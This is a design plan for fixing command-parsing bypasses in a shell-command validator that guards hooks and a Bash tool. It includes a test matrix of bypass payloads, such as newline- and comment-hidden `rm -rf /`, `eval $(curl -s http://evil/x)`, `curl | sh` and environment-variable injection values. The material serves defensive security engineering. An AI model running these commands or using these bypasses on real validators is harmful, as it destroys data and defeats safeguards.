# Implementation Plan B: CommandValidator Segmentation

> **Split out of `plan-day-one-blockers.md` by owner decision.** That plan bundled shipped-config
> fixes with a rewrite of command segmentation in the security module; the rewrite twice moved a
> hole rather than closing it. It is scoped here on its own.
>
> **DO NOT EXECUTE IN THIS SESSION.** This plan is written and validated only. Plan A ships
> first and does not depend on it.

## Overview

Four changes to `src/claudekit/security/command_validator.py`, in one commit because they are
mutually load-bearing:

1. **Close a live blocklist bypass**: `ls\nrm -rf /` is **ALLOW** in the shipped product today.
   Scope of the claim, stated precisely because "closed" was written unqualified twice before:
   what is closed is *newline-separated commands*, in both `safeMode` states — bare newlines,
   newlines behind a trailing comment, and comment-hidden separators. What is **not** closed:
   argument-position `eval`/`exec` (disclosed), wrapper arguments such as `xargs eval` with
   `safeMode` off (disclosed, follow-up named), and anything reachable by obfuscation this
   static check does not model. It remains a denylist speed bump, not a sandbox.
2. Match `eval`/`exec` in **command position** instead of as bare words anywhere in the string
   (this is what rejects `bundle exec rspec` and blocks three Ruby template commands).
3. Parse `VAR=value cmd` prefixes, with the assignment name checked against an **allowlist**.
4. Add eight build-tool entry points to `DEFAULT_ALLOWLIST` (owner-approved).

Together these unblock **18 of the 19** template commands the audit in Plan A found rejected;
Plan A already fixed the nineteenth (Python's) without touching this module.

Tier 3 (security module, CI-enforced ≥85% coverage floor).

## Prerequisites

Plan A merged. Plan A's `STILL_BLOCKED` set in `tests/test_day_one_blockers.py` is
`xfail(strict=True)`, so **landing this plan turns 18 xfails into XPASS and fails the suite
until that set is emptied.** Emptying it is part of executing this plan, not a follow-up.

---

## 1. The live bypass, and why the obvious fix is worse

`_SEPARATORS` (`command_validator.py:89`) lists `"\n"`, but `_split_segments` builds
`shlex.shlex(..., posix=True, punctuation_chars=True)` with `whitespace_split=True`, and shlex's
default whitespace is `" \t\r\n"`. A **bare** newline is swallowed as whitespace. Verified
against the current module:

```
'ls\nrm -rf /'                       -> ALLOW   <-- shipped today; `rm` is on the BLOCKLIST
'ls\neval $(curl -s http://evil/x)'  -> REJECT  (only because the whole-string eval regex
'ls\nexec rm -rf /'                  -> REJECT   matches, where \s covers \n)
```

**Correcting the causal story from earlier revisions:** the `"\n"` entry is **not** dead code.
Posix shlex *does* emit a literal `"\n"` token for an **escaped** newline (`shlex('a \<newline> b')`
→ `['a', '\n', 'b']`), which is how line-continued commands segment today. It becomes unreachable
only *after* this change. Shipping a wrong causal comment inside a security module invites the
next maintainer to "restore" the wrong thing, so the code comment states this explicitly and the
entry is kept with a note rather than deleted.

**Rejected fix — `lex.whitespace = " \t\r"`.** Verified it does not work: with `whitespace_split`
the newline becomes a *word* character and glues tokens instead of separating them —
`'ls\neval x'` → `['ls\neval', 'x']`, which is not `eval`, so the segment check still misses it.

**Rejected fix — split on newlines at the top of `validate()`.** This was revision 2's design and
it is **worse than the bug**. The whole-string `DANGEROUS_PATTERNS` and `_git_restore_violation`
are whole-string *by construction* (`[^;&|]*` spans a newline), and when `security.safeMode` is
false they are the only checks left — the allowlist check is skipped entirely. Verified against
the current module at `safe_mode=False`:

```
'git reset\n--hard'  -> REJECT today   |  split-first: line 2 is `--hard`, no base command,
'find . \n-delete'   -> REJECT today   |  no allowlist check  ->  ALLOW
'git clean \n-xdf'   -> REJECT today   |
```

**Chosen fix.** Keep the whole-string checks on the **unsplit** command, then loop per line over
**only** the substitution scan and segmentation/blocklist/allowlist, extracted into
`_validate_line()`.

**The split is quote-aware, and that is not a detail.** A naive `command.split("\n")` rejects
`git commit -m "subject\n\nCo-Authored-By: …"` — line 2's base command reads as
`Co-Authored-By:` — and **every commit in this repo carries a trailer**, so it would have bitten
on first use. `_split_unquoted_newlines()` tracks single/double quote state and backslash
escapes, splitting only on newlines that are genuinely outside quotes. Measured on the applied
module:

| input | today | after | note |
|---|---|---|---|
| `git commit -m "line1\n\nCo-Authored-By: x"` | ALLOW | **ALLOW** | preserved — the case MAJOR 1 was about |
| `ls\nrm -rf /` | ALLOW | **REJECT** | the bypass, closed |
| `ls \<newline> -la` | REJECT (`-la` not allowlisted) | **REJECT, same reason** | escaped newline untouched; *not* "Malformed" |
| `echo "a\nb` (unterminated) | Malformed | **Malformed** | stays whole, shlex reports it, fail-closed |
| `git commit -m "x\nrm -rf /"` | ALLOW | **ALLOW** | quoted text is an argument, before and after — no new hiding place |

That last row is the one worth stating plainly: honouring quotes hides nothing that was
previously caught, because quoted content was already an argument rather than a command.

#### The splitter and shlex disagreed about comments, and the disagreement was fail-open

Quote-aware splitting introduced a second parser with an opinion about where quotes are, and
review found it did not match shlex's. Verified by execution against the applied module:

```
"make test # don't rebuild\nrm -rf /"
  _split_unquoted_newlines  -> 1 line   (the apostrophe in "don't" opens a quote,
                                         so the newline reads as quoted)
  shlex, commenters='#'     -> ['make','test','rm','-rf','/']   (comment discarded,
                                         apostrophe never seen, NO separator token)
  verdict                   -> ALLOW, in BOTH modes.  `rm` is blocklisted.
```

An apostrophe in a trailing comment is ordinary English, and the Bash-tool guard is precisely
where multi-line strings with comments arrive. `ls # "\nrm -rf /` is the same shape. This also
**falsified a fail-closed claim I had written**: the splitter docstring said an unterminated
quote would reach shlex and be reported — behind a `#`, shlex never sees it.

**Fix: `lex.commenters = ""` in `_split_segments`.** The alternative — teaching the splitter
about comments — leaves two parsers that must agree about quoting *forever*, and their next
disagreement is another fail-open. Disabling comment stripping removes the disagreement at its
source: shlex stops discarding input, so both parsers see the same characters. The same payload
now raises `ValueError` → `Malformed command`, i.e. it fails **closed**.

**Regression surface of that choice, measured rather than assumed** — comment content is now
tokenized instead of dropped:

| input | today | after | |
|---|---|---|---|
| `make test # don't rebuild\nrm -rf /` | ALLOW | **REJECT** | the bypass |
| `ls # "\nrm -rf /` | ALLOW | **REJECT** | same shape |
| `echo hi # ; rm -rf /` | ALLOW | **REJECT** | comment-hidden separator, same class |
| `echo hi # don't\necho two` | ALLOW | **REJECT** | *false positive, the cost* |
| `echo hi # rebuild\necho two`, `make test # fast`, `npm run build # prod` | ALLOW | **ALLOW** | comments without an unbalanced quote are unaffected |
| `git commit -m "fix #123"`, `echo '#notacomment'` | ALLOW | **ALLOW** | `#` inside quotes was never a comment |

The cost is bounded to *comments containing an unbalanced quote character*, and it fails closed.
I checked the corpora that would carry the risk: **no `#` appears in any of the 40 template
commands, in this repo's four configured `project` commands, or in any MUST_ACCEPT case.**

An earlier revision of this plan claimed line continuations would now be "rejected as
malformed". With quote-aware splitting **that claim is false** and has been removed from the
plan, the CHANGELOG and the tests — continuations keep exactly the verdict *and the reason*
they have today, and `test_line_continuation_behaviour_is_unchanged` asserts the reason is not
"Malformed".

## 2–3. eval/exec and env prefixes — with the costs measured

**eval/exec.** Deleting the two whole-string regexes leaves only each segment's **base command**
checked. Verified: both of these REJECT today and **ALLOW** after the change —

```
'python3 -c "import x; eval(payload)"'    (and `python3 -c` is allowlisted)
'git commit -m "then exec the thing"'
```

That is a real reduction in the speed bump's surface, not merely false-positive relief. It is
disclosed in the CHANGELOG and asserted in `KNOWN_NEW_ALLOW`, so it stays a decision rather than
a side effect. Restoring the bare-word regex is not the remedy if one of these must be rejected
again — that regex is what blocks `bundle exec rspec` — a new targeted check is.

**The unsafe-mode delta, measured.** An earlier revision's unsafe-mode set contained **no
eval/exec cases at all** — the identical blind spot that hid the round-2 ordering regression.
Measured with `safe_mode=False` on the applied module:

| input | today | after | |
|---|---|---|---|
| `eval ls`, `exec rm -rf /` | REJECT | **REJECT** | `_SHELL_BUILTIN_DENY` is not gated on `safeMode` |
| `ls\neval x`, `ls\nexec rm -rf /` | REJECT | **REJECT** | command position, caught per segment |
| `ls \| xargs eval $PAYLOAD` | REJECT | **ALLOW** | *disclosed widening* — see below |
| `FOO=bar mycmd` | ALLOW | **REJECT** | *tightening* — the env allowlist is not gated either |

Command position keeps its net in both modes; what is lost is the **non-base position** once
the whole-string regexes go, because `xargs` is not blocklisted and nothing inspects a
wrapper's argument when the allowlist is off. It is asserted in `KNOWN_NEW_ALLOW_UNSAFE` so it
stays visible, and disclosed in the CHANGELOG beside the two safe-mode examples. **Follow-up,
named rather than smuggled in:** wrapper-argument inspection (`xargs`/`env`/`nohup`/`timeout`
resolving to their effective command) would close it, and it is a separate change with its own
behaviour surface — it would also alter `xargs rm`, `env FOO=1 cmd` and similar in the default
mode, which deserves its own matrix.

**Env prefixes — allowlist, not denylist.** Today *every* `VAR=val cmd` is rejected, so any
pass-through is a **widening**. A denylist cannot be complete, and its misses grant execution to
commands this same change allowlists. Verified as rejected today and allowed under a denylist
design: `RUBYOPT=-r/tmp/x bundle exec rspec`, `GIT_CONFIG_COUNT=1 git status`,
`JAVA_TOOL_OPTIONS=-javaagent:/x.jar gradlew build`, plus `GRADLE_OPTS`, `MAVEN_OPTS`,
`CLASSPATH`, `GEM_HOME`, `PYTHONHOME`, `npm_config_*`. The real demand is two commands, so:
`_SAFE_ENV_ASSIGN_NAMES = {CI, COVERAGE, XDEBUG_MODE, NODE_ENV, RAILS_ENV, RACK_ENV,
RUST_BACKTRACE, TZ, LANG, LC_ALL, NO_COLOR, FORCE_COLOR}`; anything else is refused by name.
`LANG`/`LC_ALL`/`TZ` grant no execution but do steer locale loading and output — kept, with that
reasoning recorded beside the set.

## 4. The allowlist addition (owner-approved)

**Added:** `gradle`, `gradlew`, `mvn`, `mvnw`, `golangci-lint`, `swift`, `swiftlint`,
`php-cs-fixer`. **Not added:** `pip`.

Sole canonical entry points with no non-mutating substitute; same class the allowlist already
admits (`cargo`, `dotnet`, `composer`, `bundle`, `npm`, `phpunit`); `npm` already executes
arbitrary `package.json` scripts and `./vendor/bin/phpunit` already passes, so "repo-local
script" is not a new property. None is a shell, generic exec wrapper or network fetcher — the
actual exclusion criterion behind `bash`/`sh`/`env`/`xargs`. `pip` is refused because needing it
was a *config* defect, fixed in Plan A without a policy change.

## Other disclosed behaviour changes

- **Heredoc bodies are now validated as commands — in both directions.** The favourable half:
  `cat <<EOF\nchmod 777 x\nEOF` flips ALLOW → REJECT. The cost, which an earlier revision
  disclosed only in the favourable direction: `cat <<EOF\nhello world\nEOF` also flips
  ALLOW → REJECT, because a body line's first word is read as a base command (`hello` is not
  allowlisted, and `EOF` never will be).
  **Quote-aware splitting does not resolve this, and I proved it rather than asserting it:** a
  heredoc body is not quoted, so the splitter correctly treats those newlines as separators.
  Both cases are in `HEREDOC_BODY_REJECTED` with REJECT as the asserted expectation.
  Skipping bodies was considered and rejected: it requires modelling delimiters, quoted
  delimiters, `<<-`, and multiple heredocs per line, and any error in that model is a bypass
  (`cmd <<EOF` followed by a payload the validator skips). Failing closed on a shape that is
  rare in a configured `build_cmd` is the safer error.
- **Line continuations are unchanged.** A backslash-escaped newline is not a split point, so
  `ls \<newline> -la` keeps today's verdict and today's reason. (An earlier revision, which
  split naively, did change this and mis-reported the cause; both are fixed.)
- **The malformed message no longer lies.** It said "Malformed command (unmatched quotes)"
  unconditionally; a trailing backslash actually raises `No escaped character`. It now reports
  shlex's own message — a security control must not assert a cause it did not check.

---

## Implementation Steps

1. `src/claudekit/security/command_validator.py` — **nine** edits, two of which are the
   security-critical ones and were previously unlisted here: **`_split_unquoted_newlines()`**
   (the quote-aware splitter) and **`lex.commenters = ""`** (removing the splitter/shlex
   disagreement). The other seven: +8 allowlist entries; remove the
   two whole-string eval/exec patterns; add `_SHELL_BUILTIN_DENY`, `_ENV_ASSIGN_RE`,
   `_SAFE_ENV_ASSIGN_NAMES` and the `_SEPARATORS` note; replace steps 2–3 of `validate()` with
   the per-line loop; add `_validate_line()`; strip assignment prefixes in `_validate_segment`;
   check `_SHELL_BUILTIN_DENY` **before** the `blocklist_only` early return so `$(eval …)` is
   covered.
2. `tests/test_validator_segmentation.py` — new; the bypass matrix.
3. `CHANGELOG.md` — merged into the existing `[Unreleased]` → `### Security` section.
4. **`tests/test_day_one_blockers.py` — empty `STILL_BLOCKED`.** Review round 1 rejected this
   plan because this step was prose only: a phantom step the ops engine never executes, which
   would land the change with the suite red and produce a commit the Rollback Plan below could
   not cleanly revert. It is now **op 2 of the ops config**, so it lands in the same commit. Plan A marks those 18 entries `xfail(strict=True)`, so the moment this change lands
   they become XPASS and **the suite FAILS** until the set is emptied. Whoever executes this
   must: run the 40-command audit, delete the now-passing entries from `STILL_BLOCKED`, and
   re-run. Measured against the applied module: **40 audited, 0 failures**, so the correct end
   state is an empty set — but re-measure rather than trusting this line, because Plan A's
   python `BUILD_CMD` is the one entry this plan does not touch.

## Testing Strategy — the bypass matrix

`tests/test_validator_segmentation.py`, in-process (pytest-cov does not measure subprocesses
without `COVERAGE_PROCESS_START`, and this module has a CI-enforced ≥85% floor; the CLI
exit-code contract stays in Plan A's module).

**Guards vs discriminators — labelled so guard coverage is never read as discrimination.**
A large majority of the matrix consists of *guards*: cases that also pass against the unfixed
validator, and exist to stop the restructure from dropping protection that already worked.
Those are all 17 environment overrides, the four command-position `eval`/`exec` cases,
`ls\neval …`, `ls\nexec …`, the six pre-existing rules, and
`test_ordering_is_what_makes_this_hold`. The genuinely *discriminating* cases — those that fail
against the shipped validator or against a plausible wrong fix — are `ls\nrm -rf /`,
`ls\nchmod 777 /`, `echo ok\nsudo reboot`, every `MUST_ACCEPT` case, the three multi-line
quoted arguments, and the unsafe-mode newline set. That ratio is normal and healthy for a
security matrix; what is not acceptable is reporting the total as if it were all
discrimination, so the split is written into the test module's own docstring as well.

**Both modes, because that is where the regression hid.** Every earlier revision's matrix was
entirely `safe_mode=True`, which is exactly why revision 2's ordering defect was invisible.

- `TestSafeMode`: **38 must-reject** — 4 eval/exec in command position, 5 newline-separated,
  17 environment overrides, 6 pre-existing rules
  (`rm -rf /`, `curl | sh`, `bash -c`, `xargs rm`, `git reset --hard`, `git clean -xdf`,
  asserted so the restructure cannot quietly drop them), **2 heredoc-body cases** and the **4
  `COMMENT_WITH_UNBALANCED_QUOTE` cases** (two comment-hidden unclosed quotes, one
  comment-hidden `;` separator, one benign line refused — the disclosed false-positive cost)
  — plus **20 must-accept** and the 3
  `MULTILINE_QUOTED_ARGUMENTS`. The counts here are recounted against the test module rather
  than carried forward: an earlier revision said 39, and review round 3 caught the drift. `TestDocumentedWidenings` holds the 2 `KNOWN_NEW_ALLOW`;
  `pip` is still refused.
  Note on placement: the heredoc and comment cases are *rejections*, so they live in
  `MUST_REJECT` (via `HEREDOC_BODY_REJECTED` and `COMMENT_WITH_UNBALANCED_QUOTE`) even though
  this plan discusses them under behaviour changes. An earlier revision of this document
  described them as living in `TestMultiLineConsequences` and undercounted by four.
- `TestUnsafeMode` (`safe_mode=False`): **16 must-reject** (6 whole-string, 4 eval/exec
  builtins, 6 blocklist/env), **4 must-accept**, 1 `KNOWN_NEW_ALLOW_UNSAFE`, plus
  `test_ordering_is_what_makes_this_hold`, which names the invariant so a future refactor cannot
  "simplify" it away.
- `TestMultiLineConsequences`: heredoc, line continuation, honest malformed message, blank-line
  skipping, empty/whitespace input.

**Mutants, measured against the module produced by applying this plan's own ops edits** (not a
hand-built prototype — all 8 edits were applied to a copy of the real file, which then parsed,
linted, and passed):
- Correct implementation → **95 passed**.
- **Revert `lex.commenters = ""`** (keeping everything else) → **exactly 6 failed**: the three
  comment-bypass cases, the two unbalanced-quote-comment cases, and
  `test_comment_cannot_hide_a_newline_separated_command`. **Nothing else in the 95 moves** —
  the surgical property the reviewer asked for, measured rather than asserted.
- **Naive, non-quote-aware split** → **7 failed**: the three multi-line quoted arguments in both
  modes, `test_newline_split_is_quote_aware`,
  `test_quoted_newline_does_not_hide_a_blocklisted_command`, and
  `test_line_continuation_behaviour_is_unchanged`. This is MAJOR 1.
- **Round 2's design** (split at the top of `validate()`, early return) → **14 failed**,
  including the `git reset\n--hard`-class cases and `test_ordering_is_what_makes_this_hold`.
  This is the mutant that matters, and it is the one earlier matrices missed.
- **The current shipped validator** → **31 failed**, confirming the matrix discriminates rather
  than merely guarding.
- Delete `_SHELL_BUILTIN_DENY` → the eval/exec rejections flip.
- Replace `_SAFE_ENV_ASSIGN_NAMES` with revision 1's denylist → the `RUBYOPT`,
  `JAVA_TOOL_OPTIONS`, `GRADLE_OPTS`, `MAVEN_OPTS`, `CLASSPATH`, `GEM_HOME`, `PYTHONHOME` cases
  flip.
- Drop the 8 allowlist entries → the `gradlew`/`mvn`/`golangci-lint`/`swift`/`swiftlint`/
  `php-cs-fixer` accept cases flip.

### Settled by execution during planning
- `tests/test_security.py` → **44 passed, UNCHANGED**, against the module produced by applying
  these edits. The claim that none of its assertions flips is now measured, not predicted.
- The 40-command template audit against that same module → **40 audited, 0 failures.**
- All **9** validator edits apply cleanly in order (`str.count == 1` for every anchor), and the
  result parses and passes `ruff` at line-length 100.
- The comment-bypass payloads (`make test # don't rebuild\nrm -rf /`, `ls # "\nrm -rf /`) were
  measured ALLOW in **both** modes before and REJECT in both modes after.

### Still needs execution to settle
`pytest tests/ -q` · `pytest --cov=src/claudekit/security` (≥85%) · the 40-command template audit
(expected: 0 failures, `STILL_BLOCKED` emptied) · `mypy` · `ruff` (the single `run_command` op) ·
**`tests/test_security.py` must pass UNCHANGED** — round 2 read every assertion in it and none
flips: `validate("eval $MALICIOUS")` still rejects via `_SHELL_BUILTIN_DENY` on base `eval`, and
`find . -exec rm {} \;` keeps its own pattern. Any failure there is a defect in this change.

## Rollback Plan

One commit, one module plus one new test file plus the `STILL_BLOCKED` edit: `git revert`
restores all three together, including `STILL_BLOCKED`'s 18-entry baseline — which the revert
must do, or Plan A's screen test fails for the opposite reason (18 commands blocked again with
no xfail marking them). Because the edit is an ops operation rather than a manual step, the
landed commit and what the revert undoes are now the same set of files. Reverting **partially** is unsafe —
reverting only the newline split while keeping the eval/exec change reopens `ls\neval …`. The
nine edits land and revert together — in particular, reverting `lex.commenters = ""`
while keeping the quote-aware splitter reopens the comment bypass.

## Risk Assessment

- **High:** this is the security module's parsing core, and two prior attempts each introduced a
  bypass. Mitigation is the both-mode matrix with a demonstrated failing mutant, not review
  confidence.
- **Medium:** the env-prefix pass-through (a real widening, correctly labelled); the +8 allowlist
  (owner-approved); `eval`/`exec` inside arguments no longer matched (measured, disclosed);
  heredoc and line-continuation behaviour changes.
- **Low:** CHANGELOG; the `_SEPARATORS` explanatory note.

### Blast radius
`command_validator.py` is a hub: `pre-commit.sh`, `pre-push.sh`, `post-implement.sh`, the CLI
`check-command` entry point and the Bash-tool guard all call it. Multi-line command strings are
the *normal* case for the Bash-tool guard, which is why the newline defect matters well beyond
the templates.
